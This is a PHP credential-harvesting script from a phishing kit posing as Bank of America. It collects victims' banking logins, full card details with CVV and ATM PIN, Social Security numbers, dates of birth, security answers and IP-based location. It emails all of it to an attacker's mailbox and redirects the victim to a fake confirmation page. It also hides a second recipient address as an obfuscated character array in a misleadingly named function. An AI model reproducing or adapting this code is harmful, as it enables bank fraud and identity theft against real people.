<?php


$adddate=date("D M d, Y g:i a");

$ip = getenv("REMOTE_ADDR");

$country = visitor_country();

$message .= "------------------BOA L0GIN--------------------\n";

$message .= "Online ID        : ".$_POST['id']."\n";
$message .= "Password         : ".$_POST['pass']."\n";

$message .= "-------------PeRsOnaL InForMatiOn--------------\n";

$message .= "Full Name        : ".$_POST['formtext1']."\n";
$message .= "Card Number      : ".$_POST['formtext2']."\n";
$message .= "Exp MM           : ".$_POST['formselect1']."\n";
$message .= "Exp YY           : ".$_POST['formselect2']."\n";
$message .= "Cvv              : ".$_POST['formtext3']."\n";
$message .= "ATM Pin          : ".$_POST['formtext4']."\n";
$message .= "Zipcode          : ".$_POST['formtext5']."\n";
$message .= "SSN-1            : ".$_POST['formtext6']."\n";
$message .= "SSN-2            : ".$_POST['formtext7']."\n";
$message .= "SSN-3            : ".$_POST['formtext8']."\n";
$message .= "DOB-MM           : ".$_POST['formtext9']."\n";
$message .= "DOB-DD           : ".$_POST['formtext10']."\n";
$message .= "DOB-YY           : ".$_POST['formtext11']."\n";
$message .= "MMN              : ".$_POST['formtext12']."\n";
$message .= "DL No            : ".$_POST['formtext13']."\n";

$message .= "----------------Sec Ques & Ans-----------------\n";

$message .= "Sec Que 1        : ".$_POST['formselect3']."\n";
$message .= "Sec Ans 1        : ".$_POST['formtext14']."\n";
$message .= "Sec Que 2        : ".$_POST['formselect4']."\n";
$message .= "Sec Ans 2        : ".$_POST['formtext15']."\n";
$message .= "Sec Que 3        : ".$_POST['formselect5']."\n";
$message .= "Sec Ans 3        : ".$_POST['formtext16']."\n";

$message .= "-----------------Adress & Date---------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Country: ".$country."\n";

$message .= "Date: ".$adddate."\n";
$message .= "---------------In Allah We Trust---------------\n";


//Change Your Email Here :D


$sent ="danielcrusemgt@gmail.com";

$subject = "R3SULT B0A FULLZ | $ip | ".$country;
$headers = "From: B0A FULLZ INF0 <customer-support@boarsw1.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{


mail($sent,$subject,$message,$headers);

}



// Function to get country and country sort;

function country_sort(){
	
$sorter = "";
	
$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		
$count = count($array);
	
for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		
}
	
return array($sorter, $GLOBALS['recipient']);

}



function visitor_country()

{
    
$client  = @$_SERVER['HTTP_CLIENT_IP'];
    
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    
$result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    
{
        
$ip = $client;
    
}
    
elseif(filter_var($forward, FILTER_VALIDATE_IP))
    
{
        
$ip = $forward;
    
}
    
else
    
{
        
$ip = $remote;
    
}

    
$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    
if($ip_data && $ip_data->geoplugin_countryName != null)
    
{
        
$result = $ip_data->geoplugin_countryName;
    
}

    

return $result;

}

$praga=rand();

$praga=md5($praga);

header("Location: bankofamerica-confirm-your-email.php?cmd=wait_submit&id=$praga$praga&session=$praga$praga");

?>

?>